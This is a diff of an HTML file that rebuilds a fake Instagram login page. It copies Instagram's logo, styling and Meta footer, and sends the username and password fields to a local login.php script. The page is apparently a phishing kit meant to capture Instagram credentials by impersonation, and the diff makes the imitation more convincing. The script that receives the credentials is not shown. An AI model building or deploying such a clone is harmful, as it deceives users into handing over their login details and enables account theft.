@@ -1,61 +1,191 @@
 <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+	<link rel="icon" href="Image/instagram.png" type="image/png">
 
-<html>
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-		<!-- Author: Sajjad -->
-<style>
-input {
-	width: 80%;
-	padding: 10px 20px;
-	background-color: #f2f2f2;
-	border: 1px solid gray;
-	border-radius: 4px;
-	margin: 4px;
-	}
-img {
-	width: 200px;
-	}
-button {
-	padding: 7px 135px;
-	color: white;
-	background-color: #00aaff;
-	border: none;
-	border-radius: 4px;
-	font-size: 15px;
-	font-weight: bold;
-	margin: 2px;
-	}
-#p1 {
-	font-family: sans-serif;
-	text-indent: 44%;
-	color: rgb(77, 195, 255)
-	}
-#p2{
-	color: #b3b3b3;
-	font-family: sans-serif;
-	}
-a {
-	color: #33bbff;
-	text-decoration: none;
-	font-weight: bold;
-	}
+    <!-- Author: Sajjad -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
 
-form {
-	width: 350px;
-}
-</style>
-	<body>
-		<center>
-			<img src="Image/text.png"/>
-			<br><br><br>
-			<form method="post" action="login.php">
-		<input type="text" placeholder="Phone number, username, or email" name="username"></input><br>
-		<input type="password" placeholder="Password" name="password"></input><br>
-		<p id="p1">Forgot password?</p>
-		<br>
-		<button type="submit">Log In</button>
-		<p id="p2">Don't have an account? <a href="https://www.instagram.com">Sign up</a></p>
-		</form>
-	</center>
+        .login-container {
+            background-color: #fff;
+            border: 1px solid #ddd;
+            padding: 40px 40px 20px;
+            width: 350px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 10px;
+        }
+
+        .login-container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            color: #fff;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .login-container .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .login-container .divider::before,
+        .login-container .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .login-container .divider::before {
+            margin-right: 10px;
+        }
+
+        .login-container .divider::after {
+            margin-left: 10px;
+        }
+
+        .login-container .social-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 10px;
+            font-size: 14px;
+            font-weight: bold;
+            color: #385185;
+            cursor: pointer;
+        }
+
+        .login-container .social-login img {
+            width: 30px;
+            height: 30px;
+            margin-right: 8px;
+            margin-top: 17px;
+        }
+
+        .login-container .forgot-password {
+            display: block;
+            margin-top: 10px;
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .login-container .signup-link {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .login-container .signup-link a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 10%;
+            font-size: 12px;
+            color: #787878;
+        }
+
+        .footer a {
+            color: #787878;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media screen and (max-width: 600px) {
+            .login-container {
+                width: 90%;
+                padding: 20px;
+            }
+
+            .footer {
+                font-size: 11px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <img src="Image/text.png" alt="Site Logo">
+        <form method="post" action="login.php">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required></input>
+            <input type="password" name="password" placeholder="Password" required></input>
+            <button type="submit">Log in</button>
+        </form>
+        
+        <div class="divider">OR</div>
+        
+        <div class="social-login">
+            <img src="Image/facebook-logo.png" alt="Facebook Logo">
+            <span>Log in with Facebook</span>
+        </div>
+        <a href="#" class="forgot-password">Forgot password?</a>
+
+        <div class="signup-link">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+
+    <div class="footer">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <a href="#">Meta Verified</a>
+        <br>
+        <span>© 2024 Instagram from Meta</span>
+    </div>
+
 </body>
 </html>
